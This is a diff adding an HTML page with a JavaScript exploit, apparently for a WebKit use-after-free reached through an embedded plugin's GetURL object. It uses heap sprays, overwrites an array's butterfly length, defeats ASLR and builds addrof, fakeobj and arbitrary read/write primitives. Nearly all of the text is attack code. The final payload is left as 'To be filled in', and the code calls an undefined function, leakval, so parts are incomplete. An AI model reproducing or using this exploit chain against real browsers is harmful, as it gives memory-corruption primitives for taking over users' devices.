@@ -1,0 +1,284 @@
+<script>
+// If all else fails, use that second garbage collection function.
+var worker = null;
+// Setup spray to overwrite the length header in the butterfly. Adjust "arrayLength" in these sprays so that no pointers are overwritten, which would cause a loss of the reference.
+var butterflySpray = new Array(0x1000000);
+for (var i = 0; i < 0x1000000; i++) {
+	butterflySpray[i] = [];
+	for (var k = 0; k < 0x40000; k++)
+		butterflySpray[i][k] = 0x41414141;
+	butterflySpray[i].unshift(butterflySpray[i].shift());
+}
+// Spray marked space
+var sprayOne = new Array(0x100000);
+for (var i = 0; i < 0x100000; i++) {
+	sprayOne[i] = [1];
+	if (!(i & 3))
+		for (var k = 0; k < 0x8000; k++)
+			sprayOne[i][k] = 0x42424242;
+	sprayOne[i].unshift(sprayOne[i].shift());
+}
+var sprayTwo = new Array(0x400000);
+for (var i = 0; i < 0x400000; i++) {
+	sprayTwo[i] = [2];
+	if (!(i & 3))
+		for (var k = 0; k < 0x80000; k++)
+			sprayTwo[i][k] = 0x42424242;
+	sprayTwo[i].unshift(sprayTwo[i].shift());
+}
+function start() {
+	worker = document.getElementById("worker");
+	window.top.document.getElementById("cur").addEventListener("DOMNodeInserted", callback0);
+	var intl = setInterval(function() {
+		// Setup target object for UAF, spray
+		worker.GetURL.a = [];
+		for (var i = 0; i < 0x80000; i++)
+			worker.GetURL.a[i] = 0x42420000;
+		window.top.f();
+		clearInterval(intl);
+	}, 1);
+}
+function callback0(ev) {
+// Free worker.GetURL.a (m_scriptObject), but maintain the reference to it. Then call callback().
+	window.requestAnimationFrame(callback);
+}
+// garbage collection
+function gc() {
+	// Creates 64 buffers that total up to 1.07374182 gigabytes in size.
+	for (let i = 0; i < 0x40; i++)
+		new ArrayBuffer(0x1000000);
+}
+/*
+  Int64 library for address operations
+*/
+function int64(low,hi) {
+  this.low = (low>>>0);
+  this.hi = (hi>>>0);
+  this.add32inplace = function(val) {
+    var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
+    var new_hi = (this.hi >>> 0);
+    if (new_lo < this.low) {
+      new_hi++;
+    }
+    this.hi=new_hi;
+    this.low=new_lo;
+  }
+  this.add32 = function(val) {
+    var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
+    var new_hi = (this.hi >>> 0);
+    if (new_lo < this.low) {
+      new_hi++;
+    }
+    return new int64(new_lo, new_hi);
+  }
+  this.sub32 = function(val) {
+    var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
+    var new_hi = (this.hi >>> 0);
+    if (new_lo > (this.low) & 0xFFFFFFFF) {
+      new_hi--;
+    }
+    return new int64(new_lo, new_hi);
+  }
+  this.sub32inplace = function(val) {
+    var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
+    var new_hi = (this.hi >>> 0);
+    if (new_lo > (this.low) & 0xFFFFFFFF) {
+      new_hi--;
+    }
+    this.hi=new_hi;
+    this.low=new_lo;
+  }
+  this.and32 = function(val) {
+    var new_lo = this.low & val;
+    var new_hi = this.hi;
+    return new int64(new_lo, new_hi);
+  }
+  this.and64 = function(vallo, valhi) {
+    var new_lo = this.low & vallo;
+    var new_hi = this.hi & valhi;
+    return new int64(new_lo, new_hi);
+  }
+  this.toString = function(val) {
+    val = 16; // eh
+    var lo_str = (this.low >>> 0).toString(val);
+    var hi_str = (this.hi >>> 0).toString(val);
+    if(this.hi == 0) return lo_str;
+    else {
+      lo_str = zeroFill(lo_str, 8)
+    }
+    return hi_str+lo_str;
+  }
+  this.toPacked = function() {
+    return {hi: this.hi, low: this.low};
+  }
+  this.setPacked = function(pck) {
+    this.hi=pck.hi;
+    this.low=pck.low;
+    return this;
+  }
+
+  return this;
+}
+function callback(ev) {
+	// alert(worker.GetURL.a); UAF here. Presumably, worker.GetURL.a is freed but still has a pointer to its original value (777), even though its a dangling pointer. worker.GetURL.a is analogous to uafTarget in qwertyoruiopz's 4.0x userland exploit.
+	gc();
+	// heap overflow by overwriting the "length" field of the butterfly
+	for (var i = 0; i < 0x1000000; i++) {
+		for (var k = 0x0; k < 0x80000; k++) {
+			butterflySpray[i][k] = 0x7fffffff;
+			// Find the object.
+			if (worker.GetURL.a.length == 0x7fffffff) {
+				// Store index of butterfly
+				var butterflyIndex = i;
+				// Remove references
+				for (var i = 0; i < butterflyIndex; i++)
+					butterflySpray[i] = 0;
+				for (var i = butterflyIndex + 1; i < 0x1000000; i++)
+					butterflySpray[i] = 0;
+				gc();
+				// Spray for arbitrary r/w
+				var primitiveSpray = new Array(0x20000);
+				var potentialPrim = new ArrayBuffer(0x1000);
+				for (var i = 0; i < 0x20000; i++)
+					primitiveSpray[i] = i;
+				var overlap = new Array(0x80);
+				for (var i = 0; i < 0x20000; i++)
+					primitiveSpray[i] = new Uint32Array(potentialPrim);
+				var currentQword = 0x10000;
+				var found = false;
+				var smashedButterfly = new int64(0,0);
+				var origData = new int64(0, 0);
+				var locateHelper = new int64(0, 0);
+				while (!found) {
+					// Defeat ASLR.
+					var savedVal = worker.GetURL.a[currentQword];
+					worker.GetURL.a[currentQword] = 0x1337;
+					for (var i = 0; i < 0x20000; i++) {
+						if (primitiveSpray[i] && primitiveSpray[i].byteLength != 0x1000) {
+							// Restore uint32array size as 0x1000
+							worker.GetURL.a[currentQword] = savedVal;
+							var primitive = primitiveSpray[i];
+							var overlap = [1337];
+							worker.GetURL.a[currentQword - 5] = overlap;
+							smashedButterfly.low = primitive[2];
+							smashedButterfly.hi = primitive[3];
+							smashedButterfly.keep_gc = overlap;
+							// Locate previous ArrayBufferView
+							worker.GetURL.a[currentQword - 5] = worker.GetURL.a[currentQword - 2];
+							butterflySpray[butterflyIndex][k] = 0;
+							origData.low = primitive[4];
+							origData.hi = primitive[5];
+							primitive[4] = primitive[12];
+							primitive[5] = primitive[13];
+							primitive[14] = 0x40;
+							var slave = undefined;
+							for (var k = 0; k < 0x20000; k++)
+								if (primitiveSpray[k].length == 0x40) {
+									slave = primitiveSpray[k];
+									break;
+								}
+							if(!slave)
+								throw "Could not find slave for write primitive!";
+							// Set primitive address
+							primitive[4] = smashedButterfly.low;
+							primitive[5] = smashedButterfly.hi;
+							// Setup primitive and slave
+							overlap[0] = worker.GetURL.a;
+							var targetEntry = new int64(slave[0], slave[1]);
+							primitive[4] = targetEntry.low;
+							primitive[5] = targetEntry.hi;
+							slave[2] = 0;
+							slave[3] = 0;
+							// Clear references
+							worker.GetURL.a = 0;
+							primitiveSpray = 0;
+							// Restore primitive address
+							primitive[4] = origData.low;
+							primitive[5] = origData.hi;
+							// Derive primitive functions
+							var addrof = function(obj) {
+								primitive[4] = smashedButterfly.low;
+								primitive[5] = smashedButterfly.hi;
+								overlap[0] = obj;
+								var val = new int64(slave[0], slave[1]);
+								slave[0] = 1337;
+								slave[1] = 0xffff0000;
+								primitive[4] = origData.low;
+								primitive[5] = origData.hi;
+								return val;
+							}
+							var fakeobj = function(val) {
+								primitive[4] = smashedButterfly.low;
+								primitive[5] = smashedButterfly.hi;
+								slave[0] = val.low;
+								slave[1] = val.hi;
+								var val = overlap[0];
+								slave[0] = 1337;
+								slave[1] = 0xffff0000;
+								primitive[4] = origData.low;
+								primitive[5] = origData.hi;
+								return val;
+							}
+							var read32 = function(addr) {
+								primitive[4] = addr.low;
+								primitive[5] = addr.hi;
+								var val = slave[0];
+								primitive[4] = origData.low;
+								primitive[5] = origData.hi;
+								return val;
+							}
+							var read64 = function(addr) {
+								primitive[4] = addr.low;
+								primitive[5] = addr.hi;
+								var val = new int64(slave[0], slave[1]);
+								primitive[4] = origData.low;
+								primitive[5] = origData.hi;
+								return val;
+							}
+							var write32 = function(addr, val) {
+								primitive[4] = addr.low;
+								primitive[5] = addr.hi;
+								slave[0] = val;
+								primitive[4] = origData.low;
+								primitive[5] = origData.hi;
+							}
+							var write64 = function(addr, val) {
+								primitive[4] = addr.low;
+								primitive[5] = addr.hi;
+								if (val == undefined)
+									val = new int64(0,0);
+								if (!(val instanceof int64))
+									val = new int64(val,0);
+								slave[0] = val.low;
+								slave[1] = val.hi;
+								primitive[4] = origData.low;
+								primitive[5] = origData.hi;
+							}
+							if (fakeobj(addrof(0x1337)) != 0x1337)
+								throw "Primitive is broken, jsvalue leaked does not match jsvalue created!";
+							var testData = [1,2,3,4,5,6,7,8];
+							var testAddr = leakval(testData);
+							var butterflyAddr = read64(testAddr.add32(8));
+							if ((butterflyAddr.low == 0 && butterflyAddr.hi == 0) || fakeobj(read64(butterflyAddr)) != 1)
+								throw "Primitive is broken, either butterfly address is null or object is not a valid jsvalue!";
+							/* To be filled in...
+							success */
+							alert(2);
+							return;
+						}
+					}
+					worker.GetURL.a[currentQword] = savedVal;
+					currentQword++;
+					
+				}
+			}
+		}
+	}
+	// The exploit failed.
+	alert(1);
+	return;
+}
+</script>
+<body onload="start();">
+<embed id="worker" src="data:video/mp4;"></embed>
+</body>
